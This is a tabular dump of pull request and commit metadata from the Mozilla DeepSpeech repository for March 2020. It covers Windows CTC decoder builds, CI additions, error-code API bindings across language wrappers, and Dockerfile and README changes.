1161,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2848,2848,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:55:05Z,COLLABORATOR,True,41,9,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1598be81242d4e1fa36ebf7aa489a899d0b15ff7,Add CTC decoder build on TaskCluster
1162,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43933b3d69712fceb42d0b5722ef53c2df5d6444,added API in python binding
1163,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e30a74b0eea3711b9b01faecb3f970c280f4dc2b,added API into javascript bindings
1164,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f11a7e6e82d4019258d5ed533c505941f40c3ce5,added API to deepspeech.i for java bindings
1165,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7a8bd498011c4d541cf7685f52d4f0ea97655f1,added API to .net binding
1166,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a135c017260761e742c5d1d8e66f478099c439d,made certain changes as requested
1167,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b2b7866cb0200968201295fd15ffe481af0aac,fixed EvaluateResultCode
1168,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d05a5b14d5ed3815fcb8d93f66eb12393686b8d,chnaged param errorcodes to int
1169,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0a84d0db7bc8bff4b0476bc057b50d4ae4f173c,fixed some conversion issue
1170,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2847,2847,Pr2843+build ctc windows,,lissyx,1645737,2020-03-24T11:52:14Z,COLLABORATOR,False,35,38,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbf7cf82ba611c3d65b4856b1214bc6ce21e3606,Add CTC decoder build on TaskCluster
1171,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2845,2845,Support building ctc_decoder wheel package on Windows system,,lissyx,1645737,2020-03-24T09:40:39Z,COLLABORATOR,False,58,17,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7cca2a791288febe572d4cf9bf2020109444b63,Support building ctc_decoder wheel package on Windows system
1172,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2843,2843,Support building ctc_decoder wheel package on Windows system,"This supports to build ctc_decoder wheel package on Windows system.

The package enable us to train models on Windows system.


My environments:

- Windows 10
- Visual Studio 2015
- Python 3.6
- Swig 3.0.12
- MSYS2


Build steps:

```
cd native_client\ctcdecode
set path=C:\msys64\usr\bin;%path%
set path=C:\ProgramData\swigwin-3.0.12;%path%
make TARGET=host-win
```
",ryojiysd,17523227,2020-03-24T01:01:51Z,CONTRIBUTOR,True,52,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7cca2a791288febe572d4cf9bf2020109444b63,Support building ctc_decoder wheel package on Windows system
1173,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2843,2843,Support building ctc_decoder wheel package on Windows system,"This supports to build ctc_decoder wheel package on Windows system.

The package enable us to train models on Windows system.


My environments:

- Windows 10
- Visual Studio 2015
- Python 3.6
- Swig 3.0.12
- MSYS2


Build steps:

```
cd native_client\ctcdecode
set path=C:\msys64\usr\bin;%path%
set path=C:\ProgramData\swigwin-3.0.12;%path%
make TARGET=host-win
```
",ryojiysd,17523227,2020-03-24T01:01:51Z,CONTRIBUTOR,True,52,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ffbd46cea403224d4a2a139da4faff920ca030b,Address review comments
1174,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2843,2843,Support building ctc_decoder wheel package on Windows system,"This supports to build ctc_decoder wheel package on Windows system.

The package enable us to train models on Windows system.


My environments:

- Windows 10
- Visual Studio 2015
- Python 3.6
- Swig 3.0.12
- MSYS2


Build steps:

```
cd native_client\ctcdecode
set path=C:\msys64\usr\bin;%path%
set path=C:\ProgramData\swigwin-3.0.12;%path%
make TARGET=host-win
```
",ryojiysd,17523227,2020-03-24T01:01:51Z,CONTRIBUTOR,True,52,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8046cbff0902ba5cf51c3680de3184a4112399e,Fix -fPIC typo
1175,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2840,2840,Corrected typo in flags,There was a typo in the flags and therefore in the --helpfull messages that I corrected here.,NormanTUD,34073778,2020-03-22T19:40:40Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ec19b94988d477175f700c4fcd41686dd66ca76,Corrected typo in flags
1176,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43933b3d69712fceb42d0b5722ef53c2df5d6444,added API in python binding
1177,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e30a74b0eea3711b9b01faecb3f970c280f4dc2b,added API into javascript bindings
1178,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f11a7e6e82d4019258d5ed533c505941f40c3ce5,added API to deepspeech.i for java bindings
1179,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7a8bd498011c4d541cf7685f52d4f0ea97655f1,added API to .net binding
1180,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a135c017260761e742c5d1d8e66f478099c439d,made certain changes as requested
1181,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b2b7866cb0200968201295fd15ffe481af0aac,fixed EvaluateResultCode
1182,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d05a5b14d5ed3815fcb8d93f66eb12393686b8d,chnaged param errorcodes to int
1183,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0a84d0db7bc8bff4b0476bc057b50d4ae4f173c,fixed some conversion issue
1184,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dbf83116f809a33a5ca4d9fba94f63414fa6459c,IntPtr to String correct method
1185,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2837,2837,PR #2806,,reuben,477142,2020-03-21T12:47:30Z,MEMBER,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2896e769e32326fd415a5fae219e6810a359a4b,Changed PtrToString conversion
1186,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2835,2835,Bump dependency to TensorFlow 1.15.2,Fixes security issues in TensorFlow and stops GitHub nagging us.,reuben,477142,2020-03-20T18:39:11Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,017c9a6f8c3359d2654eeffd3ba231403e00d902,"Bump dependency to TensorFlow 1.15.2

Fixes security issues in TensorFlow and stops GitHub nagging us."
1187,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2834,2834,"Add CI for Android 8.0, 9.0 and 10.0",,lissyx,1645737,2020-03-20T17:26:43Z,COLLABORATOR,True,97,2,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bedf9ef60a0f3bfdf43e04cb7db3d9ca1aa7439,"Add CI for Android 8.0, 9.0 and 10.0

We limit ourselves to x86_64 because it seems Google does not provide
any system images after API level 25 for arm64-v8a and armeabi-v7a.
There is also no system image for API level 27 for x86_64."
1188,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2833,2833,Fixed sample rate logic in Python client,"Noticed that the python client reports an incorrect duration value if transcribing audio with sample rate != 16kHz. 

The getnframes() method counts the frames directly from the wav file, while the fs var is always set to the desired 16000 sample rate when it is passed back from the convert_samplerate function, so the duration calculation is incorrect. 

Wasn't sure if I should edit the convert_samplerate function directly or make 2 distinct vars, but I ultimately decided on making 2 vars, so that the convert_samplerate function returns the usual samplerate, audio_vector tuple.",alexcannan,19368028,2020-03-19T18:47:42Z,CONTRIBUTOR,True,5,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fd39175b33531893caa65ef393923d6a27a96ff,Fixed sample rate logic in Python client
1189,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2826,2826,Add trial pruning to lm_optimizer.py,"This is an addendum to PR #2783 which adds trial pruning to the language model hyperparameter optimiser, documented here: https://optuna.readthedocs.io/en/latest/tutorial/pruning.html

The idea is to break the model inference into multiple steps so that trials can be abandoned early if the results look unpromising. I assumed that the user supplied multiple csv to the `test_files` flag in `utils/flags.py` and split the work across those. The user probably has to provide around 10 files for the feature to be useful.

I had to modify the calls to `variable_scope` in `DeepSpeech.py` in order to reuse the model across the multiple trials when it already exists.",mathematiguy,11322313,2020-03-17T21:23:19Z,CONTRIBUTOR,True,15,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9e6cbc9581dc9e8e56187a68cbc772c96cfe214,Add trial pruning to lm_optimizer.py
1190,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2826,2826,Add trial pruning to lm_optimizer.py,"This is an addendum to PR #2783 which adds trial pruning to the language model hyperparameter optimiser, documented here: https://optuna.readthedocs.io/en/latest/tutorial/pruning.html

The idea is to break the model inference into multiple steps so that trials can be abandoned early if the results look unpromising. I assumed that the user supplied multiple csv to the `test_files` flag in `utils/flags.py` and split the work across those. The user probably has to provide around 10 files for the feature to be useful.

I had to modify the calls to `variable_scope` in `DeepSpeech.py` in order to reuse the model across the multiple trials when it already exists.",mathematiguy,11322313,2020-03-17T21:23:19Z,CONTRIBUTOR,True,15,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e37a5cfb4a10a954bf933098d39e5aef05833e0,Run reset_default_graph before every evaluate
1191,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2826,2826,Add trial pruning to lm_optimizer.py,"This is an addendum to PR #2783 which adds trial pruning to the language model hyperparameter optimiser, documented here: https://optuna.readthedocs.io/en/latest/tutorial/pruning.html

The idea is to break the model inference into multiple steps so that trials can be abandoned early if the results look unpromising. I assumed that the user supplied multiple csv to the `test_files` flag in `utils/flags.py` and split the work across those. The user probably has to provide around 10 files for the feature to be useful.

I had to modify the calls to `variable_scope` in `DeepSpeech.py` in order to reuse the model across the multiple trials when it already exists.",mathematiguy,11322313,2020-03-17T21:23:19Z,CONTRIBUTOR,True,15,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7072daa05ceff1514cb287215fc4f419f102cdd0,Remove try_loading from evaluate call
1192,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2824,2824,README update,"I took some inspiration from the [tensorflow readme](https://github.com/tensorflow/tensorflow) to:

1. Point to a separate install guide. I highlighted readthedocs here (I can followup with a PR to update the docs to include an install guide)
2. Separate out installing the current release with pip from using the pre-trained models on master. Note: I'm not sure that keeping the 0.6.1 models with 0.7 syntax here makes sense, but I'm leaving it in for now.

Based on my experience and feedback here: https://discourse.mozilla.org/t/installing-deep-speech-for-the-first-time-thinking-out-loud",acabunoc,617994,2020-03-16T20:36:33Z,MEMBER,False,10,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf7f1f455ca7fafcb7a0363bf8a282bf344db359,"README update
* highlight readthedocs as main way to get started
* separate out installing the current release from using pre-trained models on master
* based on my experience here: https://discourse.mozilla.org/t/installing-deep-speech-for-the-first-time-thinking-out-loud"
1193,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2824,2824,README update,"I took some inspiration from the [tensorflow readme](https://github.com/tensorflow/tensorflow) to:

1. Point to a separate install guide. I highlighted readthedocs here (I can followup with a PR to update the docs to include an install guide)
2. Separate out installing the current release with pip from using the pre-trained models on master. Note: I'm not sure that keeping the 0.6.1 models with 0.7 syntax here makes sense, but I'm leaving it in for now.

Based on my experience and feedback here: https://discourse.mozilla.org/t/installing-deep-speech-for-the-first-time-thinking-out-loud",acabunoc,617994,2020-03-16T20:36:33Z,MEMBER,False,10,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bba1195747fd8308c2f0b2e78c67c6a3f600dc21,wording change
1194,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2821,2821,Add Windows CUDA CI,Fixes #1948,lissyx,1645737,2020-03-13T14:56:35Z,COLLABORATOR,True,254,4,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28ff863b5508230ce4596cc18f78f838c18fc33c,"Add Windows CUDA CI

Fixes #1948"
1195,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2820,2820,Correctly handle non stable versions in `--branch`,,reuben,477142,2020-03-12T16:43:42Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94cca3c65100f76f014ef4cf568600f8adaec52c,Correctly handle non stable versions in `--branch`
1196,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2819,2819,Process pool for audio preparation,,tilmankamp,5991088,2020-03-12T13:36:30Z,CONTRIBUTOR,True,9,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63bc69560047abb23d7a4f9aa4bf61491c166eaf,Process pool for audio preparation
1197,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2818,2818,Validate label locale+multiprocessing.not dummy,,lissyx,1645737,2020-03-11T12:38:30Z,COLLABORATOR,True,482,400,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9e05fe0c346aaa3303047a6014e48079f72c551,Share argparser amongst importers
1198,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2818,2818,Validate label locale+multiprocessing.not dummy,,lissyx,1645737,2020-03-11T12:38:30Z,COLLABORATOR,True,482,400,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce59228824b4a6430b03cbbc88ebbb0321642d0b,"Localizeable validate_label

Fixes #2804"
1199,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2818,2818,Validate label locale+multiprocessing.not dummy,,lissyx,1645737,2020-03-11T12:38:30Z,COLLABORATOR,True,482,400,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b2a409f9fcc9a69d30c0d5e6202634e928ba670,"Converting importers from multiprocessing.dummy to multiprocessing

Fixes #2817"
1200,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2816,2816,Validate label locale,,lissyx,1645737,2020-03-10T15:27:21Z,COLLABORATOR,False,135,64,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52be7f06294c3548d654044bc9f26c3687fde5a2,Share argparser amongst importers
1201,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2816,2816,Validate label locale,,lissyx,1645737,2020-03-10T15:27:21Z,COLLABORATOR,False,135,64,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f633520a3e70d2583740fde2fa0cf9a754b38eb6,"Localizeable validate_label

Fixes #2804"
1202,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43933b3d69712fceb42d0b5722ef53c2df5d6444,added API in python binding
1203,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e30a74b0eea3711b9b01faecb3f970c280f4dc2b,added API into javascript bindings
1204,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f11a7e6e82d4019258d5ed533c505941f40c3ce5,added API to deepspeech.i for java bindings
1205,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7a8bd498011c4d541cf7685f52d4f0ea97655f1,added API to .net binding
1206,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a135c017260761e742c5d1d8e66f478099c439d,made certain changes as requested
1207,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0b2b7866cb0200968201295fd15ffe481af0aac,fixed EvaluateResultCode
1208,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d05a5b14d5ed3815fcb8d93f66eb12393686b8d,chnaged param errorcodes to int
1209,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2815,2815,Pr2806,,lissyx,1645737,2020-03-10T09:24:59Z,COLLABORATOR,False,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0a84d0db7bc8bff4b0476bc057b50d4ae4f173c,fixed some conversion issue
1210,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2814,2814,Enhancement debian package manager tweaks,"Major Changes No 1 : debian package manager tweaks

By default, Ubuntu or Debian based ""apt"" or ""apt-get"" system installs recommended but not suggested packages . 

By passing ""--no-install-recommends"" option, the user lets apt-get know not to consider recommended packages as a dependency to install.

This results in smaller downloads and installation of packages .

Refer to blog at [Ubuntu Blog](https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends) .

Major Changes No 2 : added packages apt-utils ca-certificates

Because build is 

1.  Slow and in log it is showing because ""apt-utils"" not installed 

2. to avoid build to exits with error without having certificate",Rajpratik71,12658912,2020-03-06T19:27:28Z,CONTRIBUTOR,True,3,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69586e8c75047725971ad652ee161a9a13a2e060,"Enhancement debian package manager tweaks

Major Changes No 1 : debian package manager tweaks

By default, Ubuntu or Debian based ""apt"" or ""apt-get"" system installs recommended but not suggested packages . 

By passing ""--no-install-recommends"" option, the user lets apt-get know not to consider recommended packages as a dependency to install.

This results in smaller downloads and installation of packages .

Refer to blog at [Ubuntu Blog](https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends) .

Major Changes No 2 : added packages apt-utils ca-certificates

Because build is 

1.  Slow and in log it is showing because ""apt-utils"" not installed 

2. to avoid build to exits with error without having certificate"
1211,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2814,2814,Enhancement debian package manager tweaks,"Major Changes No 1 : debian package manager tweaks

By default, Ubuntu or Debian based ""apt"" or ""apt-get"" system installs recommended but not suggested packages . 

By passing ""--no-install-recommends"" option, the user lets apt-get know not to consider recommended packages as a dependency to install.

This results in smaller downloads and installation of packages .

Refer to blog at [Ubuntu Blog](https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends) .

Major Changes No 2 : added packages apt-utils ca-certificates

Because build is 

1.  Slow and in log it is showing because ""apt-utils"" not installed 

2. to avoid build to exits with error without having certificate",Rajpratik71,12658912,2020-03-06T19:27:28Z,CONTRIBUTOR,True,3,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00e3350ea1af34bd28d102926b65cb118b248e95,Update Dockerfile
1212,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2813,2813,Enforce proper line ending removal when reading alphabet,Fixes #2611,lissyx,1645737,2020-03-06T09:40:09Z,COLLABORATOR,True,61,10,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,763ed38baeecb07801e90875c222966f622d44b6,"Enforce proper line ending removal when reading alphabet

Fixes #2611"
1213,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2812,2812,Show actual alphabet path in error message,,lissyx,1645737,2020-03-06T09:13:55Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61fa1ad428e9f84e4e6cfb54056dfeaf2436c062,Show actual alphabet path in error message
1214,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2812,2812,Show actual alphabet path in error message,,lissyx,1645737,2020-03-06T09:13:55Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f8291df71cf6b389406d129e3d56cbf9bab3f07,Proper arguments ordering
1215,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43933b3d69712fceb42d0b5722ef53c2df5d6444,added API in python binding
1216,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e30a74b0eea3711b9b01faecb3f970c280f4dc2b,added API into javascript bindings
1217,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f11a7e6e82d4019258d5ed533c505941f40c3ce5,added API to deepspeech.i for java bindings
1218,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7a8bd498011c4d541cf7685f52d4f0ea97655f1,added API to .net binding
1219,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

Closes #2773 ",imskr,42062622,2020-03-02T14:16:38Z,COLLABORATOR,True,13,37,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a135c017260761e742c5d1d8e66f478099c439d,made certain changes as requested
1220,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2806,2806,Exposing ErrorCode API in Tree bindings,"Exposing our `DS_ErrorCodeToErrorMessage` API to our tree bindings

